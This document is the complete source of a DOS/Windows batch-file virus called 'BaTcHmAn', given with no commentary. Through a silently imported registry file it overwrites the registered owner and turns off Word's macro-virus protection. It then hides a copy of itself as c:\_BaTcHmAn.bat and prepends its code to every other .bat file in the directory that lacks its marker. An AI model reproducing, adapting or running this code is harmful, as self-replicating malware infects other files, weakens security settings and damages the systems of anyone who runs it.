echo off%_BATCHMAN%
::
BREAK off
echo REGEDIT4                       > %WINDIR%\BaTcHmAn.reg
echo. >> %WINDIR%\BaTcHmAn.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]                        >> %WINDIR%\BaTcHmAn.reg
echo "RegisteredOwner"="BaTcHmAn"                        >> %WINDIR%\BaTcHmAn.reg
echo "RegisteredOrganization"="By Dr Virus Quest"                        >> %WINDIR%\BaTcHmAn.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]                        >> %WINDIR%\BaTcHmAn.reg
echo "EnableMacroVirusProtection"="0"                        >> %WINDIR%\BaTcHmAn.reg
REGEDIT  /S /C %WINDIR%\BaTcHmAn.reg
if '%1=='BaTcHmAn goto BaTcHmAn%2
set BaTcHmAn=%0.bat
if not exist %BATCHMAN% set BaTcHmAn=%0
if '%BATCHMAN%==' set BaTcHmAn=autoexec.bat
if exist c:\_BaTcHmAn.bat goto BATANG
if not exist %BATCHMAN% goto EBATCHMA
FIND  "BaTcHmAn"                             < %BATCHMAN%>c:\_BaTcHmAn.bat
ATTRIB  c:\_BaTcHmAn.bat +h
:BATANG
COMMAND /e:5000 /c c:\_BaTcHmAn BaTcHmAn vir
:EBATCHMA
set BaTcHmAn=
goto BATANEND
:BATCHVIR
for %%i in (*.bat) do CALL c:\_BaTcHmAn BaTcHmAn i %%i
:BATANI
FIND  "BaTcHmAn"        < %3>nul
if not errorlevel 1 goto BATANJ
TYPE c:\_BaTcHmAn.bat           > BaTcHmAn$
TYPE %3            >> BaTcHmAn$
MOVE  BaTcHmAn$ %3     > nul
set BaTcHmAn#=%BATCHMAN#%1
if %BATCHMAN#%==11111111 :BATANJ
set BaTcHmAn!=%BATCHMAN!%1
if %BATCHMAN!%==111111111111111111111111 :BATANEND
::****
